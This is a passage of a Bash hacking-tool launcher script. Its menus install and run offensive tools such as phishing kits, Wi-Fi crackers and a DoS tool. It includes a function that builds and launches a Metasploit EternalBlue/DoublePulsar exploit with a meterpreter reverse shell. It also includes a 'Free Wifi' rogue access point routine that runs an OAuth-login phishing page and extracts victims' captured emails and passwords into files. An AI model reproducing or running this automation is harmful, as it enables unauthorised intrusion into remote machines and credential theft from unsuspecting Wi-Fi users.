		echo -e """$RS""29""$CE"") ""$RS""secHub""$CE""                Security/Hacking Kit"
	fi
	if [[ -d /root/SocialFish ]]
	then
		echo -e """$YS""30""$CE"") SocialFish            Ultimate phishing tool with Ngrok integrated"
	else
		echo -e """$RS""30""$CE"") ""$RS""SocialFish""$CE""            Ultimate phishing tool with Ngrok integrated"
	fi
	echo -e """$YS"" b""$CE"") Go back"
	echo -e """$YS""00""$CE"") Main menu"
	#echo -e ""$YS" 0"$CE") EXIT"
	echo -e "Choose: "
	read -e APPP
	clear
	if [[ "$APPP" = "1" ]]
	then
		if [[ -d /root/fluxion ]]
		then
			cd /root/fluxion || exit
			#~ if [[ -f /root/fluxion/fluxion ]]
			#~ then
				# shellcheck disable=SC2211 # intentional: run whatever the cloned fluxion script is actually named
				./fluxion*
			#~ elif [[ -f /root/fluxion/fluxion.sh ]]
			#~ then
				#~ ./fluxion.sh
			#~ fi
			cd || exit
		else
			echo -e "$TNI"
			read INSTALL
			if [[ "$INSTALL" = "install" ]]
			then
				install_fluxion
			else
				continue
			fi
		fi
	elif [[ "$APPP" = "2" ]]
	then
		if [[ $(command -v wifite) ]]
		then
			wifite
		else
			echo -e "$TNI"
			read INSTALL
			if [[ "$INSTALL" = "install" ]]
			then
				install_wifite
			else
				continue
			fi
		fi
	elif [[ "$APPP" = "3" ]]
	then
		if [[ -d /root/wifiphisher ]]
		then
			clear
			wifiphisher
		else
			echo -e "$TNI"
			read INSTALL
			if [[ "$INSTALL" = "install" ]]
			then
				install_wifiphisher
			else
				continue
			fi
		fi
	elif [[ "$APPP" = "4" ]]
	then
		if [[ -d /root/Zatacker ]]
		then
			if [[ -d "/root/Zatacker" ]]
			then	
				cd /root/Zatacker || exit
				./ZT.sh
				cd || exit
			else
				echo -e "You have to install it manually since its not on github.Sorry."
				sleep 4
				exec bash "$0"
			fi
		else
			echo -e "$TNI"
			read INSTALL
			if [[ "$INSTALL" = "install" ]]
			then
				install_zatacker
			else
				continue
			fi
		fi
	elif [[ "$APPP" = "5" ]]
	then
		if [[ -d /root/morpheus ]]
		then
			cd /root/morpheus || exit
			./morpheus.sh
			cd || exit
		else
			echo -e "$TNI"
			read INSTALL
			if [[ "$INSTALL" = "install" ]]
			then
				install_morpheus
			else
				continue
			fi
		fi
	elif [[ "$APPP" = "6" ]]
	then
		if [[ -d "/root/opensource" ]]
		then
			cd /root/opensource || exit
			./netool.sh
		else
			echo -e "$TNI"
			read INSTALL
			if [[ "$INSTALL" = "install" ]]
			then
				install_netool
			else
				continue
			fi
		fi
	elif [[ "$APPP" = "7" ]]
	then
		if [[ -d /root/hakkuframework ]]
		then
			echo -e "type: 'show modules' to start"
			sleep 2
			clear
			cd /root/hakkuframework || exit
			./hakku
			cd || exit
		else
			echo -e "$TNI"
			read INSTALL
			if [[ "$INSTALL" = "install" ]]
			then
				install_hakku
			else
				continue
			fi
		fi
	elif [[ "$APPP" = "8" ]]
	then
		if [[ -d /root/Trity ]]
		then
			echo -e "type: 'help' to start"
			sleep 2
			clear
			trity			
		else
			echo -e "$TNI"
			read INSTALL
			if [[ "$INSTALL" = "install" ]]
			then
				install_trity
			else
				continue
			fi
		fi
	elif [[ "$APPP" = "9" ]]
	then
		if [[ -d "/root/Dracnmap" ]]
		then
			cd /root/Dracnmap/ || exit
			# shellcheck disable=SC2211 # intentional: run whatever version-numbered dracnmap script was actually cloned
			./dracnmap-v*.sh
			cd || exit		
		else
			echo -e "$TNI"
			read INSTALL
			if [[ "$INSTALL" = "install" ]]
			then
				install_dracnmap
			else
				continue
			fi
		fi
	elif [[ "$APPP" = "10" ]]
	then
		if [[ -d "/usr/share/fern-wifi-cracker" ]]
		then
			cd /root/Fern-Wifi-Cracker || exit
			python execute.py
			cd || exit
		else
			echo -e "$TNI"
			read INSTALL
			if [[ "$INSTALL" = "install" ]]
			then
				install_fern
			else
				continue
			fi
		fi
	elif [[ "$APPP" = "11" ]]
	then
		if [[ -f /usr/sbin/netdiscover ]]
		then
			echo -e "Range (""$YS""Enter""$CE""=192.168.1.0/24):"
			read NRANGE
			if [[ -z $NRANGE ]]
			then
				NRANGE="192.168.1.0/24"
			fi
			netdiscover -r "$NRANGE" -i "$WLANN"
		else
			echo -e "$TNI"
			read INSTALL
			if [[ "$INSTALL" = "install" ]]
			then
				install_netdiscover
			else
				continue
			fi
		fi
	elif [[ "$APPP" = "12" ]]
	then
		if [[ -d "/root/kickthemout" ]]
		then
			cd /root/kickthemout || exit
			python kickthemout.py
			cd || exit
		else
			echo -e "$TNI"
			read INSTALL
			if [[ "$INSTALL" = "install" ]]
			then
				install_kickthemout
			else
				continue
			fi
		fi
	elif [[ "$APPP" = "13" ]]
	then
		if [[ -d "/usr/share/ghost-phisher" ]]
		then	
			cd /root/ghost-phisher/Ghost-Phisher || exit
			python ghost.py
			cd || exit
		else
			echo -e "$TNI"
			read INSTALL
			if [[ "$INSTALL" = "install" ]]
			then
				install_ghostphisher
			else
				continue
			fi
		fi
	elif [[ "$APPP" = "14" ]]
	then
		if [[ -d "/root/The-Eye" ]]
		then
			cd /root/The-Eye || exit
			./TheEye
			cd || exit
		else
			echo -e "$TNI"
			read INSTALL
			if [[ "$INSTALL" = "install" ]]
			then
				install_theeye
			else
				continue
			fi
		fi
	elif [[ "$APPP" = "15" ]]
	then
		if [[ -d "/root/xerxes" ]]
		then
			echo -e "Do you own the site you want to DoS?""$YNONLY"""
			read DOSTERM
			if [[ "$DOSTERM" = "y" ]]
			then

				clear
				echo -e "Enter your site(e.g: iownthissite.com): "
				echo -e "(without www)"
				read -e SITEDOS
				clear
				echo -e "Launching www.isitdownrightnow.com for $SITEDOS"
				sleep 4
				gio open http://www.isitdownrightnow.com/"$SITEDOS".html
				clear	
				cd /root/xerxes || exit
				SITEDOSX=www.$SITEDOS
				echo -e "Press ""$YS""any key""$CE"" to start DoS on $SITEDOSX"
				$READAK
				./xerxes "$SITEDOSX" 80
			else
				clear
				echo -e "Then never try this."
				sleep 3
				exec bash "$0"
			fi
		else
			echo -e "$TNI"
			read INSTALL
			if [[ "$INSTALL" = "install" ]]
			then
				install_xerxes
			else
				continue
			fi
		fi
	elif [[ "$APPP" = "16" ]]
	then
		if [[ -d /root/KatanaFramework ]]
		then
			ktf.console
		else
			echo -e "$TNI"
			read INSTALL
			if [[ "$INSTALL" = "install" ]]
			then
				install_katana
			else
				continue
			fi
		fi
	elif [[ "$APPP" = "17" ]]
	then
		if [[ -d "/root/airgeddon" ]]
		then
			cd /root/airgeddon || exit
			./airgeddon.sh
			cd || exit
		else
			echo -e "$TNI"
			read INSTALL
			if [[ "$INSTALL" = "install" ]]
			then
				install_airgeddon
			else
				continue
			fi
		fi
	elif [[ "$APPP" = "18" ]]
	then
		if [[ -d "/usr/share/websploit" ]]
		then
			websploit
		else
			echo -e "$TNI"
			read INSTALL
			if [[ "$INSTALL" = "install" ]]
			then
				install_websploit
			else
				continue
			fi
		fi
	elif [[ "$APPP" = "19" ]]
	then
		if [[ -d /etc/openvas ]]
		then
			echo -e "Start or stop?(""$YS""start""$CE""/""$YS""stop""$CE"")"
			read -e SORS
			if [[ "$SORS" == "start" ]]
			then
				netstat -nltp
				openvas-start
				echo -e "Launching firefox..."
				sleep 1
				firefox https://127.0.0.1:9392
			else
				openvas-stop
			fi
		else
			echo -e "$TNI"
			read INSTALL
			if [[ "$INSTALL" = "install" ]]
			then
				install_openvas
			else
				continue
			fi
		fi
	elif [[ "$APPP" = "20" ]]
	then
		if [[ -d "/usr/lib/ipscan" ]]
		then
			bash /usr/bin/ipscan & disown
		else
			echo -e "$TNI"
			read INSTALL
			if [[ "$INSTALL" = "install" ]]
			then
				install_angryip
			else
				continue
			fi
		fi
	elif [[ "$APPP" = "21" ]]
	then
		if [[ -d "/root/routersploit" ]]
		then
			cd /root/routersploit || exit
			./rsf.py
			cd || exit
		else
			echo -e "$TNI"
			read INSTALL
			if [[ "$INSTALL" = "install" ]]
			then
				install_routersploit
			else
				continue
			fi
		fi
	elif [[ "$APPP" = "22" ]]
	then
		if [[ -d "/root/nWatch" ]]
		then
			cd /root/nWatch || exit
			python nwatch.py
			cd || exit
		else
			echo -e "$TNI"
			read INSTALL
			if [[ "$INSTALL" = "install" ]]
			then
				install_nwatch
			else
				continue
			fi
		fi
	elif [[ "$APPP" = "23" ]]
	then
		if [[ -d "/root/eternal_scanner" ]]
		then
			cd /root/eternal_scanner || exit
			./escan
			cd || exit
		else
			echo -e "$TNI"
			read INSTALL
			if [[ "$INSTALL" = "install" ]]
			then
				install_eternalscanner
			else
				continue
			fi
		fi
	elif [[ "$APPP" = "24" ]]
	then
		if [[ -d "/root/eaphammer" ]]
		then
			eaphammer_automation
		else
			echo -e "$TNI"
			read INSTALL
			if [[ "$INSTALL" = "install" ]]
			then
				install_eaphammer
			else
				continue
			fi
		fi
		cd || exit
	elif [[ "$APPP" = "25" ]]
	then
		if [[ -d "/root/VMR" ]]
		then
			cd /root/VMR || exit
			./VMR-MDK-K2-2017R-012x2.sh
		else
			echo -e "$TNI"
			read INSTALL
			if [[ "$INSTALL" = "install" ]]
			then
				install_vmr
			else
				continue
			fi
		fi
		cd || exit
	elif [[ "$APPP" = "26" ]]
	then
		if [[ -d "/root/netattack2" ]]
		then
			cd /root/netattack2 || exit
			python2 netattack2.py
		else
			echo -e "$TNI"
			read INSTALL
			if [[ "$INSTALL" = "install" ]]
			then
				install_netattack2
			else
				continue
			fi
		fi
		cd || exit
	elif [[ "$APPP" = "27" ]]
	then
		if [[ -f "/usr/bin/wifi-pumpkin" ]]
		then
			wifi-pumpkin
		else
			echo -e "$TNI"
			read INSTALL
			if [[ "$INSTALL" = "install" ]]
			then
				install_wifi_pumpkin
			else
				continue
			fi
		fi
		cd || exit
	elif [[ "$APPP" = "28" ]]
	then
		if [[ -d "/root/Gloom-Framework" ]]
		then
			cd /root/Gloom-Framework || exit
			python gloom.py
		else
			echo -e "$TNI"
			read INSTALL
			if [[ "$INSTALL" = "install" ]]
			then
				install_gloom
			else
				continue
			fi
		fi
		cd || exit
	elif [[ "$APPP" = "29" ]]
	then
		if [[ -f "/usr/bin/sechub" ]]
		then
			sechub
		else
			echo -e "$TNI"
			read INSTALL
			if [[ "$INSTALL" = "install" ]]
			then
				install_sechub
			else
				continue
			fi
		fi
		cd || exit
	elif [[ "$APPP" = "30" ]]
	then
		if [[ -d "/root/SocialFish" ]]
		then
			cd /root/SocialFish || exit
			python SocialFish.py
		else
			echo -e "$TNI"
			read INSTALL
			if [[ "$INSTALL" = "install" ]]
			then
				install_socialfish
			else
				continue
			fi
		fi
		cd || exit
	elif [[ "$APPP" = "7" ]]
	then
		if [[ -d "/root/hakkuframework" ]]
		then
			while true
			do
			printf '\033]2;OSRFCONSOLE\a'
			clear
			echo -e """$YS"" 1""$CE"") usufy"
			echo -e """$YS"" 2""$CE"") mailfy"
			echo -e """$YS"" 3""$CE"") searchfy"
			echo -e """$YS"" 4""$CE"") domainfy"
			echo -e """$YS"" 5""$CE"") phonefy"
			echo -e """$YS"" 6""$CE"") entify"
			echo -e """$YS"" b""$CE"") Go back"
			echo -e """$YS""00""$CE"") Main menu"
		#	echo -e ""$YS" 0"$CE") EXIT"
			echo -e "Choose: "
			read -e OSFR
			clear
				if [[ "$OSFR" = "1" ]]
				then
					echo -e "Use: usufy.py -n name1 name2 -p twitter facebook"
					usufy.py
					exit
				elif [[ "$OSFR" = "2" ]]
				then
					echo -e "Use: mailfy.py -n name1"
					mailfy.py
					exit
				elif [[ "$OSFR" = "3" ]]
				then
					searchfy.py
					exit
				elif [[ "$OSFR" = "4" ]]
				then
					domainfy.py
					exit
				elif [[ "$OSFR" = "5" ]]
				then
					phonefy.py
					exit
				elif [[ "$OSFR" = "6" ]]
				then
				entify.py
					exit
				elif [[ "$OSFR" = "0" ]]
				then
					exit
				elif [[ "$OSFR" = "00" ]]
				then
					exec bash "$0"
				elif [[ "$OSFR" = "back" || "$OSFR" = "b" ]]
				then
					break
				else 
					echo -e "Wrong choice"
					sleep 0.3
					clear
					exec bash "$0"
				fi
			done
		else
			echo -e "$TNI"
			read INSTALL
			if [[ "$INSTALL" = "install" ]]
			then
				install_osrframework
			else
				continue
			fi
		fi
	elif [[ "$APPP" = "0" ]]
	then
		clear
		exit
	elif [[ "$APPP" = "00" ]]
	then
		clear
		exec bash "$0"
	elif [[ "$APPP" = "back" || "$APPP" = "b" ]]
	then
		break
	fi
	if [[ "$APPP" != "" ]]
	then
		echo -e "$PAKTGB"
		$READAK
	fi
	done
}

function eternalblue
{
	if [[ ! -d "$LPATH"/rce ]]
	then
		mkdir	"$LPATH"/rce
	fi
	EG=$(local_ips "$WLANN")
	if [[ "$EG" != "" ]]
	then
		echo -e "LHOST: (""$YS""Enter""$CE""=""$EG"") "
	else
		echo -e "LHOST: "
	fi
	read LHOSTL
	if [[ "$EG" != "" && "$LHOSTL" = "" ]]
	then
		LHOSTL="$EG"
	fi
	echo -e "RHOST: "
	read RHOSTL
	echo -e "TARGETARCHITECTURE(""$YS""x86""$CE""/""$YS""x64""$CE""): "
	read TARGETARCHL
	if [[ "$TARGETARCHL" = "x64" ]]
	then
		PROCESSINJECTL="lsass.exe"
		PAYLOADL="windows/x64/meterpreter/reverse_tcp"
	else
		PAYLOADL="windows/meterpreter/reverse_tcp"
	fi
	echo -e "TARGET(""$YS""0""$CE""-""$YS""8""$CE""): "
	read TARGETL
	echo "use exploit/windows/smb/eternalblue_doublepulsar" > "$LPATH"/rce/eternalbluerc.rc
	echo "set LHOST ""$LHOSTL""" >> "$LPATH"/rce/eternalbluerc.rc
	echo "set RHOST ""$RHOSTL""" >> "$LPATH"/rce/eternalbluerc.rc
	echo "set PAYLOAD ${PAYLOADL}" >> ${LPATH}/rce/eternalbluerc.rc
	echo "set TARGET ""$TARGETL""" >> "$LPATH"/rce/eternalbluerc.rc
	echo "set TARGETARCHITECTURE ""$TARGETARCHL""" >> "$LPATH"/rce/eternalbluerc.rc
	echo "set PROCESSINJECT ""$PROCESSINJECTL""" >> "$LPATH"/rce/eternalbluerc.rc
	echo "show info" >> "$LPATH"/rce/eternalbluerc.rc
	echo "exploit -j" >> "$LPATH"/rce/eternalbluerc.rc
	msfconsole -r "$LPATH"/rce/eternalbluerc.rc
	
}

function eternalblue_check
{
	if [[ ! -d "$LPATH"/rce ]]
	then
		mkdir	"$LPATH"/rce
	fi
	echo -e "RHOST:(""$BS""if scanning multiple hosts, seperate with space""$CE"") "
	read RHOSTL
	echo "use auxiliary/scanner/smb/smb_ms17_010" > "$LPATH"/rce/eternalbluerc.rc
	echo "set RHOSTS ""$RHOSTL""" >> "$LPATH"/rce/eternalbluerc.rc
	echo "exploit" >> "$LPATH"/rce/eternalbluerc.rc
	echo -e """$BS""Launching msfconsole. Please wait...""$CE"""
	msfconsole -r "$LPATH"/rce/eternalbluerc.rc
	
}

function wififb_attack
{
	
	while true
	do
		clear
		TERMINALTITLE="WIFIFB-MENU"
		dash_calc
		printf '\033]2;WIFIFB-MENU\a'	
		echo -e """$YS"" 1""$CE"") Start attack (""$BS""always end the attack with ESC""$CE"")"
		echo -e """$YS"" 2""$CE"") Check & save new passwords (""$BS""do it at the end of the attack""$CE"")"
		echo -e """$YS"" 3""$CE"") Show all-saved-passwords"
		echo -e """$YS"" 4""$CE"") Copy all-saved-passwords file to desktop"
		echo -e """$YS"" 5""$CE"") Delete the all-saved-passwords file"
		echo -e """$YS"" 6""$CE"") Fix no wifi issue after the attack"
		echo -e """$YS"" b""$CE"") Go back"
		echo -e "Choose:"
		read wifimenu
		clear
		if [[ "$wifimenu" == 1 ]]
		then
			wififb
		elif [[ "$wifimenu" == 2 ]]
		then
			wififb_pass
			echo -e "$PAKTGB"
			$READAK
		elif [[ "$wifimenu" == 3 ]]
		then
			if [[ -f $wififbpassfileall ]]
			then
				cat $wififbpassfileall
			else
				echo -e """$RS""File not found. Get some paswords first.""$CE"""
			fi
			echo -e "$PAKTGB"
			$READAK
		elif [[ "$wifimenu" == 4 ]]
		then
			cp $wififbpassfileall /root/Desktop/all-saved-passwords.txt && echo -e "Done"
		elif [[ "$wifimenu" == 5 ]]
		then
			rm $wififbpassfileall && echo -e "Done"
		elif [[ "$wifimenu" == 6 ]]
		then
			nmcli n on
			echo -e "Error fixed, you may need to restart your system"
			echo -e "$PAKTGB"
			$READAK
		elif [[ "$wifimenu" == 'b' || "$wifimenu" == "back" || "$wifimenu" == 00 ]]
		then
			exec bash "$0"
		fi
	done
}

function wififb
{
	echo -e "Access point's name: "
	echo -e " ""$YS""1""$CE"") Free Wifi"
	echo -e " ""$YS""2""$CE"") FREE WIFI"
	echo -e " ""$YS""3""$CE"") Wifi Hotspot"
	echo -e " ""$YS""4""$CE"") WIFI HOTSPOT"
	echo -e " ""$YS""5""$CE"") Hotspot"
	echo -e " ""$YS""6""$CE"") Android Hotspot"
	echo -e " ""$YS""7""$CE"") Cafe Wifi"
	echo -e " ""$YS""8""$CE"") Public Wifi"
	echo -e " ""$YS""9""$CE"") PUBLIC WIFI"
	echo -e """$YS""10""$CE"") Free Public Wifi"
	echo -e """$YS""11""$CE"") FREE PUBLIC WIFI"
	echo -e " ""$YS""c""$CE"") Custom name"
	echo -e " ""$YS""b""$CE"") Go back"
	read wifiind
	if [[ "$wifiind" == 1 ]]
	then
		wifiname="Free Wifi"
	elif [[ "$wifiind" == 2 ]]
	then
		wifiname="FREE WIFI"
	
	elif [[ "$wifiind" == 3 ]]
	then
		wifiname="Wifi Hotspot"
	
	elif [[ "$wifiind" == 4 ]]
	then
		wifiname="WIFI HOTSPOT"
	
	elif [[ "$wifiind" == 5 ]]
	then
		wifiname="Hotspot"
	
	elif [[ "$wifiind" == 6 ]]
	then
		wifiname="Android Hotspot"
	
	elif [[ "$wifiind" == 7 ]]
	then
		wifiname="Cafe Wifi"
	
	elif [[ "$wifiind" == 8 ]]
	then
		wifiname="Public Wifi"
	
	elif [[ "$wifiind" == 9 ]]
	then
		wifiname="PUBLIC WIFI"
	
	elif [[ "$wifiind" == 10 ]]
	then
		wifiname="Free Public Wifi"
	
	elif [[ "$wifiind" == 11 ]]
	then
		wifiname="FREE PUBLIC WIFI"
	
	elif [[ "$wifiind" == 'c' ]]
	then
		clear
		echo -e "Custom access point name:"
		read wifiname
	elif [[ "$wifiind" == 'b' || "$wifiind" == 'back' ]]
	then
		wififb_attack
	fi
	ESSIDAP=$wifiname
	export ESSIDAP
	export wififbfile
	xterm -hold -geometry 160x60+9999+999999 -e bash -c 'printf "\033]2;WIFI FB TRAP\a" && wifiphisher --noextensions --essid "$ESSIDAP" -p oauth-login -kB --logging | tee $wififbfile; exec bash' & disown 
}

function wififb_pass
{
	if [[ -f $wififbfile ]]
	then
		##findhowmanylines
		lines=$(cat $wififbfile | awk 'END{print NR}')
		n=1
		z=0
		while [[ "$n" -le "$lines" ]]
		do
			USERNAME=""
			PASS=""
			USERNAME=$(cat $wififbfile | awk  -v nn="$n" '{if(NR==nn && /wfphshr-email=/)print}' | awk -F "email=" '{print $2}' | cut -d '&' -f1)
			if [[ ! "$USERNAME" == "" ]]
			then
				z=$((z+1))
				PASS=$(cat $wififbfile | awk  -v nn="$n" '{if(NR==nn && /word=/)print}' | awk -F "word=" '{print $2}' | cut -d '&' -f1)
				if [[ "$PASS" == "" ]]
				then
					PASS="No password found"
				fi
				echo -e """$USERNAME"":""$PASS""" >> $wififbpassfile
			fi
			USERNAME=""
			PASS=""
			n=$((n+1))
		done
		if [[ "$z" == 0 ]]
		then
			echo -e "No usernames or passwords found" >> $wififbpassfile
		fi
		echo -e "----------------------------------------------------------------" >> $wififbpassfile
		cat $wififbpassfile
		if [[ ! "$z" == 0 ]]
		then
			cat $wififbpassfile >> $wififbpassfileall
			cat $wififbfile >> $wififbfileall
			echo -e "New usernames/passwords moved to all-saved-passwords file"
		fi
		echo -e "" > $wififbpassfile
		echo -e "" > $wififbfile
	else
		echo -e """$RS""$wififbfile not found.""$CE"""
		sleep 3
	fi
}
